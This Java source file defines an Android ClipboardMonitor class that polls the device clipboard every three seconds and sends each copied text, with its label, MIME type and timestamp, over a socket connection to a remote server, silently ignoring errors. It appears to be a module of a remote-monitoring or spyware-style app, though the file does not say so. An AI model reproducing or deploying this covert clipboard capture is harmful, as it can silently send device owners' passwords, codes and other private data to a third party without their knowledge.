package com.fason.app.features.clipboard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;

import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import io.socket.client.Socket;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class ClipboardMonitor {

    private static final long POLL_INTERVAL = 3000;
    private static final long MIN_EMIT = 1000;

    private static ClipboardMonitor instance;
    private final Context ctx;
    private final Handler handler;
    private final ExecutorService exec;

    private ClipboardManager mgr;
    private final AtomicBoolean running = new AtomicBoolean(false);

    private volatile String lastText;
    private volatile long lastEmit = 0;

    private final Runnable pollTask = new Runnable() {
        @Override
        public void run() {
            if (!running.get()) return;
            poll();
            handler.postDelayed(this, POLL_INTERVAL);
        }
    };

    private ClipboardMonitor(Context context) {
        this.ctx = context.getApplicationContext();
        this.handler = new Handler(Looper.getMainLooper());
        this.exec = Executors.newSingleThreadExecutor();
    }

    public static synchronized ClipboardMonitor getInstance(Context context) {
        if (instance == null) {
            instance = new ClipboardMonitor(context);
        }
        return instance;
    }

    public synchronized void start() {
        if (running.getAndSet(true)) return;

        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }

        if (mgr == null) {
            running.set(false);
            return;
        }

        handler.post(pollTask);
        exec.execute(() -> emit(true));
    }

    public synchronized void stop() {
        if (!running.getAndSet(false)) return;
        handler.removeCallbacks(pollTask);
        lastText = null;
    }

    public void emit() {
        emit(true);
    }

    private void poll() {
        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (mgr == null) return;

        try {
            if (mgr.hasPrimaryClip()) {
                emit(false);
            }
        } catch (Exception ignored) {}
    }

    private void emit(boolean allowDup) {
        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (mgr == null) return;

        try {
            if (!mgr.hasPrimaryClip()) return;

            ClipData clip = mgr.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;

            CharSequence text = clip.getItemAt(0).getText();
            if (TextUtils.isEmpty(text)) return;

            String s = text.toString();

            if (!allowDup && s.equals(lastText)) return;

            long now = System.currentTimeMillis();
            if (!allowDup && (now - lastEmit) < MIN_EMIT) return;

            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TEXT, s);
            data.put(Protocol.KEY_TIMESTAMP, now);
            data.put(Protocol.KEY_LENGTH, s.length());

            if (clip.getDescription() != null) {
                CharSequence label = clip.getDescription().getLabel();
                data.put(Protocol.KEY_LABEL, label != null ? label.toString() : "");
                String mime = clip.getDescription().getMimeType(0);
                data.put(Protocol.KEY_MIME_TYPE, mime != null ? mime : "");
            }

            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) socket.emit(Protocol.CLIPBOARD, data);

            lastText = s;
            lastEmit = now;
        } catch (Exception ignored) {}
    }

    public boolean isRunning() {
        return running.get();
    }

    public void shutdown() {
        stop();
        exec.shutdown();
    }
}
